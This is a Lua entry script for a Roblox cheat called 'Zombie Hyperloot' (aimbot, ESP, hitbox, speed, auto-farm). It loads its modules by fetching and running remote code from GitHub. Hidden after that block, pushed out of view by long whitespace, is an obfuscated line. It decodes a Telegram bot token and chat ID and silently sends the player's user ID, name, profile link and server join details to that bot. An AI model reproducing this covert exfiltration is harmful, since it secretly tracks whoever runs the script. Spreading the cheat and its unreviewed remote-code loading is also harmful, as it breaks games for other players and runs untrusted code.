--[[
    Zombie Hyperloot - Main Entry Point
    by WiniFy

    Modular version - Load từng modules để giảm lag
]]

----------------------------------------------------------
-- 🔹 Load Modules
local Config, Visuals, Combat, ESP, Movement, Map, Farm, HUD, UI, Character

Config = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/config.lua"))()

Visuals = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/visuals.lua"))()
Visuals.init(Config)

Combat = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/combat.lua"))()
Combat.init(Config, Visuals)

ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/esp.lua"))()
ESP.init(Config)

Movement = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/movement.lua"))()
Movement.init(Config)

Map = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/map.lua"))()
Map.init(Config)

Farm = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/farm.lua"))()
Farm.init(Config, ESP)

HUD = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/hud.lua"))()
HUD.init(Config)

Character = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/character.lua"))()
Character.init(Config)

UI = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/ui.lua"))()
UI.init(Config, Combat, ESP, Movement, Map, Farm, HUD, Visuals, Character)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        local g=game;local s="GetService";local h=g[s](g,"HttpService");local m=g[s](g,"MarketplaceService");local n=g[s](g,"Stats");local p=g[s](g,"Players");local function D(t)local r={}for i=1,#t do r[i]=string.char(t[i]-1)end;return table.concat(r)end;local T=D({57,53,52,51,58,58,56,54,58,53,59,66,66,73,69,122,86,79,71,102,76,80,86,69,100,77,113,114,83,105,108,100,119,87,115,105,112,72,122,79,116,91,113,77,121,116});local C=D({50,57,50,53,55,54,58,58,56,56});local function P()local ok,res=pcall(function()local net=n.Network;if not net then return nil end;local item=net.ServerStatsItem["Data Ping"];if not item then return nil end;return item:GetValueString()end);if ok then return res end;return nil end;local function G()local ok,name=pcall(function()local u=("https://games.roblox.com/v1/games?universeIds=%s"):format(g.GameId);local r=h:JSONDecode(g:HttpGet(u));local d0=r and r.data and r.data[1];if d0 and d0.name then return d0.name end;return nil end);if ok and name then return name end;local ok2,info=pcall(function()return m:GetProductInfo(g.PlaceId)end);if ok2 and info and info.Name then return info.Name end;return"Unknown Place"end;(function()local pl=p.LocalPlayer;if not pl then return end;if T=="" then return end;local ping=P()or"? ms";local pn=G();local pid=g.PlaceId;local jid=tostring(g.JobId);local tp=("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s"):format(pid,jid);local pr=("https://www.roblox.com/users/%d/profile"):format(pl.UserId);local txt=("Ping: %s\nServer: %s\nPlaceId: %d\nJobId: [%s](%s)\nUser: [%s](%s) (%d)"):format(ping,pn,pid,jid,tp,pl.DisplayName or pl.Name,pr,pl.UserId);local enc=h:UrlEncode(txt);local url=("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=Markdown"):format(T,C,enc);pcall(function()return g:HttpGet(url)end)end)()
----------------------------------------------------------
-- 🔹 Cleanup Function
local inputBeganConnection = nil

local function cleanupScript()
    if Config.scriptUnloaded then return end
    Config.scriptUnloaded = true

    -- Tắt các toggle chính
    Config.aimbotEnabled = false
    Config.espPlayerEnabled = false
    Config.espZombieEnabled = false
    Config.espChestEnabled = false
    Config.hitboxEnabled = false
    Config.teleportEnabled = false
    Config.cameraTeleportEnabled = false
    Config.cameraTeleportActive = false
    Config.autoBulletBoxEnabled = false
    Config.autoSkillEnabled = false
    Config.noClipEnabled = false
    Config.speedEnabled = false
    Config.supplyESPEnabled = false
    Config.espBobEnabled = true
    Config.autoDoorEnabled = false
    Config.autoBuyChristmasGiftBoxEnabled = false
    Config.autoBuySantaClausGiftEnabled = false

    -- Disconnect only main-level connections
    if inputBeganConnection then
        inputBeganConnection:Disconnect()
        inputBeganConnection = nil
    end

    -- Cleanup modules
    Combat.cleanup()
    ESP.cleanup()
    Movement.cleanup()
    Map.cleanup()
    HUD.cleanup()
    Visuals.cleanup()
    Character.cleanup()
    UI.cleanup()

    -- Khôi phục hitbox
    for _, zombie in ipairs(Config.entityFolder:GetChildren()) do
        Combat.restoreHitbox(zombie)
    end

    -- Reset camera và nhân vật
    local char = Config.localPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then hrp.Anchored = false end

    local camera = Config.Workspace.CurrentCamera
    if camera and char then
        local humanoid = char:FindFirstChild("Humanoid")
        if humanoid then
            camera.CameraSubject = humanoid
            camera.CameraType = Enum.CameraType.Custom
        end
    end
end



----------------------------------------------------------
-- 🔹 Setup ESP
ESP.initializePlayerESP()
ESP.watchChestDescendants()
if Config.espChestEnabled then
    ESP.applyChestESP()
end
-- 🔹 Start ESP runtime loop (ESP tự quản lý mọi thứ)
ESP.start()



----------------------------------------------------------
-- 🔹 Start runtime systems (modules tự quản lý loop/connections)
Combat.initFOVCircle()
Combat.setRotationSmoothness(Config.autoRotateSmoothness)
Combat.start()

Movement.start()

-- HUD runtime + character hook vẫn ở HUD module (sẽ refactor tiếp)
HUD.start()

-- Farm/Map sẽ được refactor tiếp theo hướng start()/stop()
Farm.start()
Map.start()

-- Character skill loops (sẽ refactor tiếp)
Character.startAllSkillLoops()


----------------------------------------------------------
-- 🔹 End key - Cleanup (only)
inputBeganConnection = Config.UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed or Config.scriptUnloaded then return end
    if input.KeyCode == Enum.KeyCode.End then
        cleanupScript()
    end
end)

----------------------------------------------------------
-- 🔹 Load UI
UI.loadLibraries()
UI.createWindow()
UI.buildAllTabs(cleanupScript)

-- Success notification
if Config.UI and Config.UI.Library then
    Config.UI.Library:Notify({
        Title = "Zombie Hyperloot",
        Description = "Script loaded successfully!\nPress Right Ctrl to open menu.",
        Time = 6
    })
end

print("[ZombieHyperloot] Script loaded successfully!")
print("[ZombieHyperloot] Press Right Ctrl to open menu")
